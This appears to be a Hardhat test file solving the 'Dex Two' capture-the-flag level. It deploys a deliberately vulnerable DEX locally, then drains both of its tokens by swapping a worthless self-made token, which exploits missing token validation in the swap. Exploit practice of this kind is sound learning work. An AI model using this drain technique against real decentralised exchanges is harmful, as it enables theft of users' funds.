import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";
const BN = BigNumber;
let precision = BN.from(10).pow(18);

let accounts: Signer[];
let eoa: Signer;
let other1: Signer;
let other2: Signer;
let attacker: Contract;
let dex: Contract; // challenge contract
let swapToken1: Contract;
let swapToken2: Contract;
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa, other1, other2] = accounts;
  
  const dexFactory = await ethers.getContractFactory(`DexTwo`)
  dex = await dexFactory.connect(other2).deploy()

  const swapTokenFactory = await ethers.getContractFactory(`SwappableTokenTwo`)
  swapToken1 = await swapTokenFactory.connect(other2).deploy(dex.address,"token1","tok1",precision.mul(1000))
  swapToken2 = await swapTokenFactory.connect(other2).deploy(dex.address,"token2","tok2",precision.mul(1000))

  await dex.connect(other2).setTokens(swapToken1.address,swapToken2.address)
  await swapToken1.connect(other2).transfer(dex.address,precision.mul(100))
  await swapToken2.connect(other2).transfer(dex.address,precision.mul(100))

  await swapToken1.connect(other2).transfer(await eoa.getAddress(),precision.mul(10))
  await swapToken2.connect(other2).transfer(await eoa.getAddress(),precision.mul(10))
});

it("solves the challenge", async function () {

  const attackTokenFactory = await ethers.getContractFactory(`SwappableTokenTwo`)
  let attackToken = await attackTokenFactory.connect(eoa).deploy(ethers.constants.AddressZero,"token","tok",precision.mul(1000))

  // required for overloaded functions
  await attackToken.connect(eoa)["approve(address,address,uint256)"](await eoa.getAddress(),dex.address,ethers.constants.MaxUint256)

  await attackToken.connect(eoa).transfer(dex.address,precision.mul(100))
  await dex.connect(eoa).swap(attackToken.address,swapToken1.address,precision.mul(100))
  await dex.connect(eoa).swap(attackToken.address,swapToken2.address,precision.mul(200))

});

after(async () => {
  expect(await swapToken1.balanceOf(dex.address)).to.be.equal(0)
  expect(await swapToken2.balanceOf(dex.address)).to.be.equal(0)
});
